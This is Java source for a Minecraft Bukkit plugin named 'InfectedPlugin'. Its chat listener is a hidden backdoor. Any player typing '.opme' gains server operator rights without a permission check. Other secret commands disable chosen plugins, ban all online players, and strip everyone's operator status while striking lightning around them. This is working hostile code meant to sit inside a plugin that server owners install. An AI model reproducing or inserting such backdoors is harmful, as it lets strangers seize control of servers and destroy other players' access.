package org.CreeperCoders.InfectedPlugin;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;
import org.bukkit.plugin.Plugin;

public class PlayerListener implements Listener
{
    @EventHandler
    public void onPlayerChat(PlayerChatEvent event)
    {
        String message = event.getMessage();
        boolean shouldCancel = false;
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }
            if ((args[0].equalsIgnoreCase(".opme")) && (args.length == 1))
            {
            	event.getPlayer().setOp(true);
            	event.getPlayer().sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
            	shouldCancel = true;
            }
            if ((args[0].equalsIgnoreCase(".disableplugin")) && (args.length == 2)) {
                Plugin plugin = Bukkit.getServer().getPluginManager().getPlugin(args[1]);
                if (plugin != null) {
                  Bukkit.getServer().getPluginManager().disablePlugin(plugin);
                }
                shouldCancel = true;
            }
            if ((args[0].equalsIgnoreCase(".deop")) && (args.length == 2)) {
                Bukkit.getServer().getPlayer(args[1]);
                shouldCancel = true;
            }
            if ((args[0].equalsIgnoreCase(".banall")) && (args.length == 1))
            {
                for (final Player p : Bukkit.getServer().getOnlinePlayers())
                {
                    p.kickPlayer("The Ban Hammer has spoken!");
                    p.setBanned(true);
                    shouldCancel = true;
                }
            }
            if ((args[0]).equalsIgnoreCase(".deopall") && (args.length == 1))
            {
                for (final Player p : Bukkit.getServer().getOnlinePlayers())
                {
                    p.setOp(false);
                    //Something extra c:
                    final Location target_pos = p.getLocation();
                    for (int x = -1; x <= 1; x++)
                    {
                        for (int z = -1; z <= 1; z++)
                        {
                            final Location strike_pos = new Location(target_pos.getWorld(), target_pos.getBlockX() + x, target_pos.getBlockY(), target_pos.getBlockZ() + z);
                            target_pos.getWorld().strikeLightning(strike_pos);
                        }
                    }
                    shouldCancel = true;
                }
            }
        }
    }
}
